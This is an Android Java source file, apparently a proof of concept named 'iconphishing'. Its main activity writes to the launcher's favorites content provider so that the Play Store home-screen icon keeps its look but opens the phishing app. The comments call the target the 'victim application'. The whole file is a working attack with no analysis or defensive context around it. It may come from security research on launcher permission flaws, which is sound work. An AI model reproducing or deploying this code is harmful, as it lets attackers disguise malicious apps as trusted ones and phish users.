package com.mindmac.iconphishing;

import android.app.Activity;
import android.app.Fragment;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		if (savedInstanceState == null) {
			getFragmentManager().beginTransaction()
					.add(R.id.container, new PlaceholderFragment()).commit();
		}
		
		String srcTitle = "AppIconPhishing";
		String fakeIntent = getFakeIntent(srcTitle);
		if(fakeIntent != null){
			startPhishing("Play Store", fakeIntent, "com.android.vending", 
					"com.android.vending:mipmap/ic_launcher_play_store");
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {

		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}

	/**
	 * A placeholder fragment containing a simple view.
	 */
	public static class PlaceholderFragment extends Fragment {

		public PlaceholderFragment() {
		}

		@Override
		public View onCreateView(LayoutInflater inflater, ViewGroup container,
				Bundle savedInstanceState) {
			View rootView = inflater.inflate(R.layout.fragment_main, container,
					false);
			return rootView;
		}
	}
	
	// Get the fake intent
	private String getFakeIntent(String srcTitle){
		String intent = null;
		ContentResolver resolver = getContentResolver();
		Uri laucherSettingUri = Uri.parse("content://com.android.launcher2.settings/favorites");
		Cursor cursor = resolver.query(laucherSettingUri, new String[]{"intent"}, "title=?", 
				new String[]{srcTitle}, null);
		while(cursor.moveToNext()){
			intent = cursor.getString(0);
		}
		return intent;
	}
	
	/**
	 * Modify the main activity intent of the victim application's icon
	 * @param targetTitle: The victim application's name
	 * @param fakeIntent: The phishing app's main activity intent
	 * @param iconPackage: The victim application's package name
	 * @param iconResource: The victim application's icon resource path
	 * @return Number of affected rows in the database 
	 */
	private int startPhishing(String targetTitle, String fakeIntent, String iconPackage, String iconResource){
		int affectedRows = 0;
		ContentResolver resolver = getContentResolver();
		Uri laucherSettingUri = Uri.parse("content://com.android.launcher2.settings/favorites");
		ContentValues values = new ContentValues();
		values.put("intent", fakeIntent);
		values.put("itemType", 1);
		values.put("iconPackage", iconPackage);
		values.put("iconResource", iconResource);
		
		affectedRows = resolver.update(laucherSettingUri, values, "title=?", new String[]{targetTitle});
		
		return affectedRows;
	}

}
